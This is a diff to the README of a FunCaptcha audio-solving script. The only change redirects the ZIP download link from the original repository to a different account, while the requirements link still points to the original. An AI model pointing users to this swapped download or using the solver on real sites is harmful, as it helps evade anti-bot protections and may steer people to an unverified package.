@@ -14,7 +14,7 @@
 
 ### Usage
 
-1. Download ZIP <a href="https://github.com/useragents/Funcaptcha-Audio-Solver/archive/refs/heads/main.zip">here</a> and extract the ZIP
+1. Download ZIP <a href="https://github.com/1xmr/Funcaptcha-Audio-Solver/archive/refs/heads/main.zip">here</a> and extract the ZIP
 2. Install <a href="https://github.com/useragents/Funcaptcha-Audio-Solver/blob/main/requirements.txt">requirements.txt</a> by typing `pip install -r requirements.txt` in Command Prompt
 3. Open `main.py` script in a text editor or other and change the `public_key` and `site` values to your own.
 4. Run `main.py` script and it will return the token
